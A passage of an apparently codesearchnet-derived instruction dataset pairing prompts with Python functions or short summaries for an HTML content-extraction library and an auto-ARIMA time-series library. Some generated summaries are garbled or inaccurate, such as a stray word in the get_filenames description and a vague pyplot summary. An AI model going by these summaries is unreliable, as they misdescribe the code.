were kept\n\n    # get a flattened sequence of all tokens in all blocks\n    # and their corresponding block ids\n    all_blocks_tokens = []\n    all_blocks_tokens_block_id = []\n    for i, block_tokens in enumerate(blocks_tokens):\n        all_blocks_tokens.extend(block_tokens)\n        all_blocks_tokens_block_id.extend([i] * len(block_tokens))\n    # TODO: do we really need `num_all_blocks_tokens`?\n    # it was used to determine if there were more gold standard tokens than *all*\n    # tokens, and if so, some info was written to disk\n    # but it seems like an odd check, and it's probably better to take the\n    # gold standard data at face value -- presumably, somebody checked it!\n    # num_all_blocks_tokens = len(all_blocks_tokens)\n\n    def get_frac_and_str_tokens_in_gs(gs_txt):\n        \"\"\"\n        For each block, determine which and what fraction of tokens are\n        also in the gold standard text ``gs_txt`` for either content\n        or comments.\n\n        Returns:\n            List[float]\n            List[str]\n        \"\"\"\n        gs_tokens = tokenizer(gs_txt)\n\n        tokens_in_gs = check_inclusion(all_blocks_tokens, gs_tokens)\n        num_blocks_tokens_in_gs = [0 for _ in range(len(blocks))]\n        blocks_tokens_in_gs_tokens = [[] for _ in range(len(blocks))]\n        for token, token_in_gs, block_id in zip(all_blocks_tokens, tokens_in_gs, all_blocks_tokens_block_id):\n            if token_in_gs is True:\n                num_blocks_tokens_in_gs[block_id] += 1\n                blocks_tokens_in_gs_tokens[block_id].append(token)\n\n        blocks_tokens_strs_in_gs = [\n            ' '.join(block_tokens_in_gs_tokens)\n            for block_tokens_in_gs_tokens in blocks_tokens_in_gs_tokens]\n        frac_blocks_tokens_in_gs = [\n            num_block_tokens_in_gs / num_block_tokens\n            for num_block_tokens_in_gs, num_block_tokens\n            in zip(num_blocks_tokens_in_gs, num_blocks_tokens)]\n\n        return (frac_blocks_tokens_in_gs, blocks_tokens_strs_in_gs)\n\n    gs_content, gs_comments = read_gold_standard_file(data_dir, fileroot, cetr)\n    frac_blocks_tokens_in_gs_content, blocks_tokens_strs_in_gs_content = \\\n        get_frac_and_str_tokens_in_gs(gs_content)\n    frac_blocks_tokens_in_gs_comments, blocks_tokens_strs_in_gs_comments = \\\n        get_frac_and_str_tokens_in_gs(gs_comments)\n\n    output_fname = os.path.join(\n        data_dir, GOLD_STANDARD_BLOCKS_DIRNAME, fileroot + GOLD_STANDARD_BLOCKS_EXT)\n    line_fmt = u'{frac_content}\\t{frac_comments}\\t{block_tokens}\\t{content_tokens}\\t{comment_tokens}\\n'\n    with io.open(output_fname, mode='w') as f:\n        for block_id, block_tokens in enumerate(blocks_tokens):\n            line = line_fmt.format(\n                frac_content=frac_blocks_tokens_in_gs_content[block_id],\n                frac_comments=frac_blocks_tokens_in_gs_comments[block_id],\n                block_tokens=' '.join(block_tokens),\n                content_tokens=blocks_tokens_strs_in_gs_content[block_id],\n                comment_tokens=blocks_tokens_strs_in_gs_comments[block_id])\n            f.write(line)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_filenames(dirname, full_path=False, match_regex=None, extension=None):\n    if not os.path.exists(dirname):\n        raise OSError('directory \"{}\" does not exist'.format(dirname))\n    match_regex = re.compile(match_regex) if match_regex else None\n    for filename in sorted(os.listdir(dirname)):\n        if extension and not os.path.splitext(filename)[-1] == extension:\n            continue\n        if match_regex and not match_regex.search(filename):\n            continue\n        if full_path is True:\n            yield os.path.join(dirname, filename)\n        else:\n            yield filename", "response": "Get all filenames under dirname that match match_regex or have file\nTaxonomy extension equal to extension optionally prepending the full path."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef read_html_file(data_dir, fileroot, encoding=None):\n    fname = os.path.join(\n        data_dir, RAW_HTML_DIRNAME, fileroot + RAW_HTML_EXT)\n    encodings = (encoding,) if encoding else ('utf-8', 'iso-8859-1')  # 'utf-16'\n    for encoding in encodings:\n        try:\n            with io.open(fname, mode='rt', encoding=encoding) as f:\n                raw_html = f.read()\n            break\n        except (UnicodeDecodeError, UnicodeError):\n            raw_html = None\n\n    return ftfy.fix_encoding(raw_html).strip()", "response": "Read the HTML file corresponding to identifier fileroot in the raw HTML directory below the root data_dir."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreads the gold standard content file corresponding to identifier fileroot and return the contents string and comments string respectively.", "response": "def read_gold_standard_file(data_dir, fileroot, encoding=None, cetr=False):\n    \"\"\"\n    Read the gold standard content file corresponding to identifier ``fileroot``\n    in the gold standard directory below the root ``data_dir``.\n\n    Args:\n        data_dir (str)\n        fileroot (str)\n        encoding (str)\n        cetr (bool): if True, assume no comments and parse the gold standard\n            to remove tags\n\n    Returns:\n        List[str, str]: contents string and comments string, respectively\n    \"\"\"\n    fname = os.path.join(\n        data_dir, GOLD_STANDARD_DIRNAME, fileroot + GOLD_STANDARD_EXT)\n    encodings = (encoding,) if encoding else ('utf-8', 'utf-16', 'iso-8859-1')\n    for encoding in encodings:\n        try:\n            with io.open(fname, mode='rt', encoding=encoding) as f:\n                gold_standard = f.read()\n            break\n        except (UnicodeDecodeError, UnicodeError):\n            gold_standard = None\n\n    if not gold_standard:\n        return [u'', u'']\n\n    if not cetr:\n        content_comments = RE_COMMENTS_DELIM.split(gold_standard, maxsplit=1)\n        # if no comments delimiter found, append empty comments string\n        if len(content_comments) == 1:\n            content_comments = [content_comments[0], u'']\n    else:\n        tree = etree.fromstring(gold_standard, parser=etree.HTMLParser())\n        content_comments = [u' '.join(text_from_subtree(tree)), u'']\n\n    # fix text in case of mangled encodings\n    content_comments = [ftfy.fix_encoding(content_comments[0]).strip(),\n                        ftfy.fix_encoding(content_comments[1]).strip()]\n\n    return content_comments"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreading the gold standard blocks file corresponding to identifier fileroot in the gold standard blocks directory below the root data_dir.", "response": "def read_gold_standard_blocks_file(data_dir, fileroot, split_blocks=True):\n    \"\"\"\n    Read the gold standard blocks file corresponding to identifier ``fileroot``\n    in the gold standard blocks directory below the root ``data_dir``.\n\n    Args:\n        data_dir (str)\n        fileroot (str)\n        split_blocks (bool): If True, split the file's content into blocks.\n\n    Returns:\n        str or List[str]\n    \"\"\"\n    fname = os.path.join(\n        data_dir, GOLD_STANDARD_BLOCKS_DIRNAME, fileroot + GOLD_STANDARD_BLOCKS_EXT)\n    with io.open(fname, mode='r') as f:\n        data = f.read()\n    if split_blocks:\n        return filter(None, data[:-1].split('\\n'))\n    return filter(None, data)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nprepare data for a single HTML + gold standard blocks example uniquely identified by fileroot.", "response": "def prepare_data(data_dir, fileroot, block_pct_tokens_thresh=0.1):\n    \"\"\"\n    Prepare data for a single HTML + gold standard blocks example, uniquely\n    identified by ``fileroot``.\n\n    Args:\n        data_dir (str)\n        fileroot (str)\n        block_pct_tokens_thresh (float): must be in [0.0, 1.0]\n\n    Returns:\n        Tuple[str, Tuple[np.array[int], np.array[int], List[str]], Tuple[np.array[int], np.array[int], List[str]]]:\n            The first element is simply the raw html as a string. The second and\n            third elements are 3-tuples for content and comments, respectively,\n            where the first element is a numpy array of 1s and 0s whose values\n            correspond to whether or not a given block is considered non-content\n            or not; the second element is a numpy integer array whose values are\n            the total number of tokens in each block; and the third element is\n            a flat list of content or comment tokens as strings, concatenated\n            from all blocks.\n\n    See Also:\n        :func:`prepare_all_data`\n    \"\"\"\n    if not 0.0 <= block_pct_tokens_thresh <= 1.0:\n        raise ValueError('block_pct_tokens_thresh must be in the range [0.0, 1.0]')\n\n    html = read_html_file(data_dir, fileroot)\n    blocks = read_gold_standard_blocks_file(data_dir, fileroot, split_blocks=True)\n\n    content_blocks = []\n    comments_blocks = []\n    for block in blocks:\n        block_split = block.split('\\t')\n        num_block_tokens = len(block_split[2].split())\n        # total number of tokens in block is used as weights\n        content_blocks.append(\n            (float(block_split[0]), num_block_tokens, block_split[3].split()))\n        comments_blocks.append(\n            (float(block_split[1]), num_block_tokens, block_split[4].split()))\n\n    parsed_content_blocks = _parse_content_or_comments_blocks(\n        content_blocks, block_pct_tokens_thresh)\n    parsed_comments_blocks = _parse_content_or_comments_blocks(\n        comments_blocks, block_pct_tokens_thresh)\n\n    return (html, parsed_content_blocks, parsed_comments_blocks)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nprepare data for all HTML + gold standard blocks examples in data_dir.", "response": "def prepare_all_data(data_dir, block_pct_tokens_thresh=0.1):\n    \"\"\"\n    Prepare data for all HTML + gold standard blocks examples in ``data_dir``.\n\n    Args:\n        data_dir (str)\n        block_pct_tokens_thresh (float): must be in [0.0, 1.0]\n\n    Returns:\n        List[Tuple[str, List[float, int, List[str]], List[float, int, List[str]]]]\n\n    See Also:\n        :func:`prepare_data`\n    \"\"\"\n    gs_blocks_dir = os.path.join(data_dir, GOLD_STANDARD_BLOCKS_DIRNAME)\n    gs_blocks_filenames = get_filenames(\n        gs_blocks_dir, full_path=False, match_regex=re.escape(GOLD_STANDARD_BLOCKS_EXT))\n    gs_blocks_fileroots = (\n        re.search(r'(.+)' + re.escape(GOLD_STANDARD_BLOCKS_EXT), gs_blocks_filename).group(1)\n        for gs_blocks_filename in gs_blocks_filenames)\n\n    return [prepare_data(data_dir, fileroot, block_pct_tokens_thresh)\n            for fileroot in gs_blocks_fileroots]"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconvert any bytes - like input to a string - like output with respect to python version", "response": "def str_cast(maybe_bytes, encoding='utf-8'):\n    \"\"\"\n    Converts any bytes-like input to a string-like output, with respect to\n    python version\n\n    Parameters\n    ----------\n    maybe_bytes : if this is a bytes-like object, it will be converted to a string\n    encoding  : str, default='utf-8'\n        encoding to be used when decoding bytes\n    \"\"\"\n    if isinstance(maybe_bytes, bytes_):\n        return maybe_bytes.decode(encoding)\n    else:\n        return maybe_bytes"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nconvert any string - like input to a bytes - like output with respect to python version", "response": "def bytes_cast(maybe_str, encoding='utf-8'):\n    \"\"\"\n    Converts any string-like input to a bytes-like output, with respect to\n    python version\n\n    Parameters\n    ----------\n    maybe_str : if this is a string-like object, it will be converted to bytes\n    encoding  : str, default='utf-8'\n        encoding to be used when encoding string\n    \"\"\"\n    if isinstance(maybe_str, unicode_):\n        return maybe_str.encode(encoding)\n    else:\n        return maybe_str"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef str_dict_cast(dict_, include_keys=True, include_vals=True, **kwargs):\n    new_keys = str_list_cast(dict_.keys(), **kwargs) if include_keys else dict_.keys()\n    new_vals = str_list_cast(dict_.values(), **kwargs) if include_vals else dict_.values()\n    new_dict = dict(zip_(new_keys, new_vals))\n    return new_dict", "response": "Converts any bytes - like items in input dict to string - like values with respect to python version"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nconvert any string - like items in input dict to bytes - like values with respect to python version", "response": "def bytes_dict_cast(dict_, include_keys=True, include_vals=True, **kwargs):\n    \"\"\"\n    Converts any string-like items in input dict to bytes-like values, with\n    respect to python version\n\n    Parameters\n    ----------\n    dict_ : dict\n        any string-like objects contained in the dict will be converted to bytes\n    include_keys : bool, default=True\n        if True, cast keys to bytes, else ignore\n    include_values : bool, default=True\n        if True, cast values to bytes, else ignore\n    kwargs:\n        encoding: str, default: 'utf-8'\n            encoding to be used when encoding string\n    \"\"\"\n    new_keys = bytes_list_cast(dict_.keys(), **kwargs) if include_keys else dict_.keys()\n    new_vals = bytes_list_cast(dict_.values(), **kwargs) if include_vals else dict_.values()\n    new_dict = dict(zip_(new_keys, new_vals))\n    return new_dict"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef str_block_cast(block,\n                   include_text=True,\n                   include_link_tokens=True,\n                   include_css=True,\n                   include_features=True,\n                   **kwargs):\n    \"\"\"\n    Converts any bytes-like items in input Block object to string-like values,\n    with respect to python version\n\n    Parameters\n    ----------\n    block : blocks.Block\n        any bytes-like objects contained in the block object will be converted\n        to a string\n    include_text : bool, default=True\n        if True, cast text to a string, else ignore\n    include_link_tokens : bool, default=True\n        if True, cast link_tokens to a string, else ignore\n    include_css : bool, default=True\n        if True, cast css to a string, else ignore\n    include_features : bool, default=True\n        if True, cast features to a string, else ignore\n    kwargs:\n        encoding: str, default: 'utf-8'\n            encoding to be used when decoding bytes\n    \"\"\"\n    if include_text:\n        block.text = str_cast(block.text, **kwargs)\n    if include_link_tokens:\n        block.link_tokens = str_list_cast(block.link_tokens, **kwargs)\n    if include_css:\n        block.css = str_dict_cast(block.css, **kwargs)\n    if include_features:\n        block.features = str_dict_cast(block.features, **kwargs)\n    return block", "response": "Converts any bytes - like items in input Block object to a string - like values with respect to python version"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef bytes_block_cast(block,\n                     include_text=True,\n                     include_link_tokens=True,\n                     include_css=True,\n                     include_features=True,\n                     **kwargs):\n    \"\"\"\n    Converts any string-like items in input Block object to bytes-like values,\n    with respect to python version\n\n    Parameters\n    ----------\n    block : blocks.Block\n        any string-like objects contained in the block object will be converted\n        to bytes\n    include_text : bool, default=True\n        if True, cast text to bytes, else ignore\n    include_link_tokens : bool, default=True\n        if True, cast link_tokens to bytes, else ignore\n    include_css : bool, default=True\n        if True, cast css to bytes, else ignore\n    include_features : bool, default=True\n        if True, cast features to bytes, else ignore\n    kwargs:\n        encoding: str, default: 'utf-8'\n            encoding to be used when encoding string\n    \"\"\"\n    if include_text:\n        block.text = bytes_cast(block.text, **kwargs)\n    if include_link_tokens:\n        block.link_tokens = bytes_list_cast(block.link_tokens, **kwargs)\n    if include_css:\n        block.css = bytes_dict_cast(block.css, **kwargs)\n    if include_features:\n        block.features = bytes_dict_cast(block.features, **kwargs)\n    return block", "response": "Converts any string - like items in input Block object to bytes - like values with respect to python version"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting an instance of a Features class by name.", "response": "def get_feature(name):\n    \"\"\"Get an instance of a ``Features`` class by ``name`` (str).\"\"\"\n    if name == 'css':\n        return CSSFeatures()\n    elif name == 'kohlschuetter':\n        return KohlschuetterFeatures()\n    elif name == 'readability':\n        return ReadabilityFeatures()\n    elif name == 'weninger':\n        return WeningerFeatures()\n    elif name == 'clustered_weninger':\n        return ClusteredWeningerFeatures()\n    else:\n        raise ValueError('invalid feature name: \"{}\"'.format(name))"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncalculating the Damerau - Levenshtein distance between two sequences.", "response": "def dameraulevenshtein(seq1, seq2):\n    \"\"\"Calculate the Damerau-Levenshtein distance between sequences.\n\n    This distance is the number of additions, deletions, substitutions,\n    and transpositions needed to transform the first sequence into the\n    second. Although generally used with strings, any sequences of\n    comparable objects will work.\n\n    Transpositions are exchanges of *consecutive* characters; all other\n    operations are self-explanatory.\n\n    This implementation is O(N*M) time and O(M) space, for N and M the\n    lengths of the two sequences.\n\n    >>> dameraulevenshtein('ba', 'abc')\n    2\n    >>> dameraulevenshtein('fee', 'deed')\n    2\n\n    It works with arbitrary sequences too:\n    >>> dameraulevenshtein('abcd', ['b', 'a', 'c', 'd', 'e'])\n    2\n    \"\"\"\n    # codesnippet:D0DE4716-B6E6-4161-9219-2903BF8F547F\n    # Conceptually, this is based on a len(seq1) + 1 * len(seq2) + 1 matrix.\n    # However, only the current and two previous rows are needed at once,\n    # so we only store those.\n    oneago = None\n    thisrow = list(range_(1, len(seq2) + 1)) + [0]\n    for x in range_(len(seq1)):\n        # Python lists wrap around for negative indices, so put the\n        # leftmost column at the *end* of the list. This matches with\n        # the zero-indexed strings and saves extra calculation.\n        twoago, oneago, thisrow = oneago, thisrow, [0] * len(seq2) + [x + 1]\n        for y in range_(len(seq2)):\n            delcost = oneago[y] + 1\n            addcost = thisrow[y - 1] + 1\n            subcost = oneago[y - 1] + (seq1[x] != seq2[y])\n            thisrow[y] = min(delcost, addcost, subcost)\n            # This block deals with transpositions\n            if (x > 0 and y > 0 and seq1[x] == seq2[y - 1] and\n                    seq1[x - 1] == seq2[y] and seq1[x] != seq2[y]):\n                thisrow[y] = min(thisrow[y], twoago[y - 2] + 1)\n    return thisrow[len(seq2) - 1]"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncomputing the evaluation metrics for a set of predicted and actual tokens.", "response": "def evaluation_metrics(predicted, actual, bow=True):\n    \"\"\"\n    Input:\n        predicted, actual = lists of the predicted and actual tokens\n        bow: if true use bag of words assumption\n    Returns:\n        precision, recall, F1, Levenshtein distance\n    \"\"\"\n    if bow:\n        p = set(predicted)\n        a = set(actual)\n\n        true_positive = 0\n        for token in p:\n            if token in a:\n                true_positive += 1\n    else:\n        # shove actual into a hash, count up the unique occurances of each token\n        # iterate through predicted, check which occur in actual\n        from collections import defaultdict\n        act = defaultdict(lambda: 0)\n        for token in actual:\n            act[token] += 1\n\n        true_positive = 0\n        for token in predicted:\n            if act[token] > 0:\n                true_positive += 1\n                act[token] -= 1\n\n        # for shared logic below\n        p = predicted\n        a = actual\n\n    try:\n        precision = true_positive / len(p)\n    except ZeroDivisionError:\n        precision = 0.0\n    try:\n        recall = true_positive / len(a)\n    except ZeroDivisionError:\n        recall = 0.0\n    try:\n        f1 = 2.0 * (precision * recall) / (precision + recall)\n    except ZeroDivisionError:\n        f1 = 0.0\n\n    # return (precision, recall, f1, dameraulevenshtein(predicted, actual))\n    return (precision, recall, f1)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngetting and combine features in a list of features.", "response": "def get_and_union_features(features):\n    \"\"\"\n    Get and combine features in a :class:`FeatureUnion`.\n\n    Args:\n        features (str or List[str], ``Features`` or List[``Features``], or List[Tuple[str, ``Features``]]):\n            One or more features to be used to transform blocks into a matrix of\n            numeric values. If more than one, a :class:`FeatureUnion` is\n            automatically constructed. Example inputs::\n\n                features = 'weninger'\n                features = ['weninger', 'kohlschuetter']\n                features = WeningerFeatures()\n                features = [WeningerFeatures(), KohlschuetterFeatures()]\n                features = [('weninger', WeningerFeatures()), ('kohlschuetter', KohlschuetterFeatures())]\n\n    Returns:\n        :class:`FeatureUnion` or ``Features``\n    \"\"\"\n    if not features:\n        raise ValueError('invalid `features`: may not be null')\n    if isinstance(features, (list, tuple)):\n        if isinstance(features[0], tuple):\n            return FeatureUnion(features)\n        elif isinstance(features[0], string_):\n            return FeatureUnion([(feature, get_feature(feature)) for feature in features])\n        else:\n            return make_union(*features)\n    elif isinstance(features, string_):\n        return get_feature(features)\n    else:\n        return features"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nloading a pickled model from disk.", "response": "def load_pickled_model(filename, dirname=None):\n    \"\"\"\n    Load a pickled ``Extractor`` model from disk.\n\n    Args:\n        filename (str): Name of pickled model file under ``dirname``.\n        dirname (str): Name of directory on disk containing the pickled model.\n            If None, dragnet's default pickled model directory is used:\n            /path/to/dragnet/pickled_models/[PY_VERSION]_[SKLEARN_VERSION]\n\n    Returns:\n        :class:`dragnet.extractor.Extractor`\n    \"\"\"\n    if dirname is None:\n        pkg_filename = pkgutil.get_loader('dragnet').get_filename('dragnet')\n        pkg_dirname = os.path.dirname(pkg_filename)\n        dirname = os.path.join(pkg_dirname, 'pickled_models', model_path)\n    filepath = os.path.join(dirname, filename)\n    return joblib.load(filepath)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef nsdiffs(x, m, max_D=2, test='ocsb', **kwargs):\n    if max_D <= 0:\n        raise ValueError('max_D must be a positive integer')\n\n    # get the test - this validates m internally\n    testfunc = get_callable(test, VALID_STESTS)(m, **kwargs)\\\n        .estimate_seasonal_differencing_term\n    x = column_or_1d(check_array(x, ensure_2d=False,\n                                 force_all_finite=True, dtype=DTYPE))\n\n    if is_constant(x):\n        return 0\n\n    D = 0\n    dodiff = testfunc(x)\n    while dodiff == 1 and D < max_D:\n        D += 1\n        x = diff(x, lag=m)\n\n        if is_constant(x):\n            return D\n        dodiff = testfunc(x)\n\n    return D", "response": "Estimate the seasonal differencing term for different levels of time series."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nestimating the number of differences required to make a given time - series stationary.", "response": "def ndiffs(x, alpha=0.05, test='kpss', max_d=2, **kwargs):\n    \"\"\"Estimate ARIMA differencing term, ``d``.\n\n    Perform a test of stationarity for different levels of ``d`` to\n    estimate the number of differences required to make a given time\n    series stationary. Will select the maximum value of ``d`` for which\n    the time series is judged stationary by the statistical test.\n\n    Parameters\n    ----------\n    x : array-like, shape=(n_samples, [n_features])\n        The array (time series) to difference.\n\n    alpha : float, optional (default=0.05)\n        Level of the test. This is the value above below which the P-value\n        will be deemed significant.\n\n    test : str, optional (default='kpss')\n        Type of unit root test of stationarity to use in order to\n        test the stationarity of the time-series. One of ('kpss', 'adf', 'pp')\n\n    max_d : int, optional (default=2)\n        Maximum number of non-seasonal differences allowed. Must\n        be a positive integer. The estimated value of ``d`` will not\n        exceed ``max_d``.\n\n    Returns\n    -------\n    d : int\n        The estimated differencing term. This is the maximum value of ``d``\n        such that ``d <= max_d`` and the time series is judged stationary.\n        If the time series is constant, will return 0.\n\n    References\n    ----------\n    .. [1] R's auto_arima ndiffs function: https://bit.ly/2Bu8CHN\n    \"\"\"\n    if max_d <= 0:\n        raise ValueError('max_d must be a positive integer')\n\n    # get the test\n    testfunc = get_callable(test, VALID_TESTS)(alpha, **kwargs).should_diff\n    x = column_or_1d(check_array(x, ensure_2d=False,\n                                 force_all_finite=True, dtype=DTYPE))\n\n    # base case, if constant return 0\n    d = 0\n    if is_constant(x):\n        return d\n\n    # get initial diff\n    pval, dodiff = testfunc(x)\n\n    # if initially NaN, return 0\n    if np.isnan(pval):\n        return 0  # (d is zero, but this is more explicit to the reader)\n\n    # Begin loop.\n    while dodiff and d < max_d:\n        d += 1\n\n        # do differencing\n        x = diff(x)\n        if is_constant(x):\n            return d\n\n        # get new result\n        pval, dodiff = testfunc(x)\n\n        # if it's NaN now, take the last non-null one\n        if np.isnan(pval):\n            return d - 1\n\n    # when d >= max_d\n    return d"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef bind_df_model(model_fit, arima_results):\n    if not hasattr(arima_results, 'df_model'):\n        df_model = model_fit.k_exog + model_fit.k_trend + \\\n            model_fit.k_ar + model_fit.k_ma + \\\n            model_fit.k_seasonal_ar + model_fit.k_seasonal_ma\n        setattr(arima_results, 'df_model', df_model)", "response": "Binds the model degrees of freedom in place to the arima_results object."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_compatible_pyplot(backend=None, debug=True):\n    import matplotlib\n\n    # If the backend provided is None, just default to\n    # what's already being used.\n    existing_backend = matplotlib.get_backend()\n    if backend is not None:\n        # Can this raise?...\n        matplotlib.use(backend)\n\n        # Print out the new backend\n        if debug:\n            sys.stderr.write(\"Currently using '%s' MPL backend, \"\n                             \"switching to '%s' backend%s\"\n                             % (existing_backend, backend, os.linesep))\n\n    # If backend is not set via env variable, but debug is\n    elif debug:\n        sys.stderr.write(\"Using '%s' MPL backend%s\"\n                         % (existing_backend, os.linesep))\n\n    from matplotlib import pyplot as plt\n    return plt", "response": "Returns a matplotlib. pyplot object that can be used to plot the MPL."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nfits an AutoARIMA estimator to a vector y of observations with an optional matrix of exogenous variables.", "response": "def fit(self, y, exogenous=None, **fit_args):\n        \"\"\"Fit the auto-arima estimator\n\n        Fit an AutoARIMA to a vector, ``y``, of observations with an\n        optional matrix of ``exogenous`` variables.\n\n        Parameters\n        ----------\n        y : array-like or iterable, shape=(n_samples,)\n            The time-series to which to fit the ``ARIMA`` estimator. This may\n            either be a Pandas ``Series`` object (statsmodels can internally\n            use the dates in the index), or a numpy array. This should be a\n            one-dimensional array of floats, and should not contain any\n            ``np.nan`` or ``np.inf`` values.\n\n        exogenous : array-like, shape=[n_obs, n_vars], optional (default=None)\n            An optional 2-d array of exogenous variables. If provided, these\n            variables are used as additional features in the regression\n            operation. This should not include a constant or trend. Note that\n            if an ``ARIMA`` is fit on exogenous features, it must be provided\n            exogenous features for making predictions.\n\n        **fit_args : dict or kwargs\n            Any keyword arguments to pass to the auto-arima function.\n        \"\"\"\n        self.model_ = auto_arima(\n            y, exogenous=exogenous, start_p=self.start_p, d=self.d,\n            start_q=self.start_q, max_p=self.max_p, max_d=self.max_d,\n            max_q=self.max_q, start_P=self.start_P, D=self.D,\n            start_Q=self.start_Q, max_P=self.max_P, max_D=self.max_D,\n            max_Q=self.max_Q, max_order=self.max_order, m=self.m,\n            seasonal=self.seasonal, stationary=self.stationary,\n            information_criterion=self.information_criterion,\n            alpha=self.alpha, test=self.test, seasonal_test=self.seasonal_test,\n            stepwise=self.stepwise, n_jobs=self.n_jobs,\n            start_params=self.start_params, trend=self.trend,\n            method=self.method, transparams=self.transparams,\n            solver=self.solver, maxiter=self.maxiter, disp=self.disp,\n            callback=self.callback, offset_test_args=self.offset_test_args,\n            seasonal_test_args=self.seasonal_test_args,\n            suppress_warnings=self.suppress_warnings,\n            error_action=self.error_action, trace=self.trace,\n            random=self.random, random_state=self.random_state,\n            n_fits=self.n_fits,\n            return_valid_fits=False,  # only return ONE\n            out_of_sample_size=self.out_of_sample_size, scoring=self.scoring,\n            scoring_args=self.scoring_args, with_intercept=self.with_intercept,\n            **fit_args)\n\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nplots a series' auto-correlation. A wrapper method for the Pandas ``autocorrelation_plot`` method. Parameters ---------- series : array-like, shape=(n_samples,) The series or numpy array for which to plot an auto-correlation. show : bool, optional (default=True) Whether to show the plot after it's been created. If not, will return the plot as an Axis object instead. Notes ----- This method will only show the plot if ``show=True`` (which is the default behavior). To simply get the axis back (say, to add to another canvas), use ``show=False``. Examples -------- >>> autocorr_plot([1, 2, 3], False) # doctest: +SKIP <matplotlib.axes._subplots.AxesSubplot object at 0x127f41dd8> Returns ------- res : Axis or None If ``show`` is True, does not return anything. If False, returns the Axis object.", "response": "def autocorr_plot(series, show=True):\n    \"\"\"Plot a series' auto-correlation.\n\n    A wrapper method for the Pandas ``autocorrelation_plot`` method.\n\n    Parameters\n    ----------\n    series : array-like, shape=(n_samples,)\n        The series or numpy array for which to plot an auto-correlation.\n\n    show : bool, optional (default=True)\n        Whether to show the plot after it's been created. If not, will return\n        the plot as an Axis object instead.\n\n    Notes\n    -----\n    This method will only show the plot if ``show=True`` (which is the default\n    behavior). To simply get the axis back (say, to add to another canvas),\n    use ``show=False``.\n\n    Examples\n    --------\n    >>> autocorr_plot([1, 2, 3], False)  # doctest: +SKIP\n    <matplotlib.axes._subplots.AxesSubplot object at 0x127f41dd8>\n\n    Returns\n    -------\n    res : Axis or None\n        If ``show`` is True, does not return anything. If False, returns\n        the Axis object.\n    \"\"\"\n    _err_for_no_mpl()\n    res = ap(series)\n    return _show_or_return(res, show)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef plot_acf(series, ax=None, lags=None, alpha=None, use_vlines=True,\n             unbiased=False, fft=True, title='Autocorrelation',\n             zero=True, vlines_kwargs=None, show=True, **kwargs):\n    \"\"\"Plot a series' auto-correlation as a line plot.\n\n    A wrapper method for the statsmodels ``plot_acf`` method.\n\n    Parameters\n    ----------\n    series : array-like, shape=(n_samples,)\n        The series or numpy array for which to plot an auto-correlation.\n\n    ax : Matplotlib AxesSubplot instance, optional\n        If given, this subplot is used to plot in instead of a new figure being\n        created.\n\n    lags : int, array-like or None, optional (default=None)\n        int or Array of lag values, used on horizontal axis. Uses\n        np.arange(lags) when lags is an int.  If not provided,\n        ``lags=np.arange(len(corr))`` is used.\n\n    alpha : scalar, optional (default=None)\n        If a number is given, the confidence intervals for the given level are\n        returned. For instance if alpha=.05, 95 % confidence intervals are\n        returned where the standard deviation is computed according to\n        Bartlett's formula. If None, no confidence intervals are plotted.\n\n    use_vlines : bool, optional (default=True)\n        If True, vertical lines and markers are plotted.\n        If False, only markers are plotted.  The default marker is 'o'; it can\n        be overridden with a ``marker`` kwarg.\n\n    unbiased : bool, optional (default=False)\n        If True, then denominators for autocovariance are n-k, otherwise n\n\n    fft : bool, optional (default=True)\n        If True, computes the ACF via FFT.\n\n    title : str, optional (default='Autocorrelation')\n        Title to place on plot. Default is 'Autocorrelation'\n\n    zero : bool, optional (default=True)\n        Flag indicating whether to include the 0-lag autocorrelation.\n        Default is True.\n\n    vlines_kwargs : dict, optional (default=None)\n        Optional dictionary of keyword arguments that are passed to vlines.\n\n    show : bool, optional (default=True)\n        Whether to show the plot after it's been created. If not, will return\n        the plot as an Axis object instead.\n\n    **kwargs : kwargs, optional\n        Optional keyword arguments that are directly passed on to the\n        Matplotlib ``plot`` and ``axhline`` functions.\n\n    Notes\n    -----\n    This method will only show the plot if ``show=True`` (which is the default\n    behavior). To simply get the axis back (say, to add to another canvas),\n    use ``show=False``.\n\n    Examples\n    --------\n    >>> plot_acf([1, 2, 3], show=False)  # doctest: +SKIP\n    <matplotlib.figure.Figure object at 0x122fab4e0>\n\n    Returns\n    -------\n    plt : Axis or None\n        If ``show`` is True, does not return anything. If False, returns\n        the Axis object.\n    \"\"\"\n    _err_for_no_mpl()\n    res = pacf(x=series, ax=ax, lags=lags, alpha=alpha, use_vlines=use_vlines,\n               unbiased=unbiased, fft=fft, title=title, zero=zero,\n               vlines_kwargs=vlines_kwargs, **kwargs)\n\n    return _show_or_return(res, show)", "response": "A wrapper method for the statsmodels plot_acf method."}
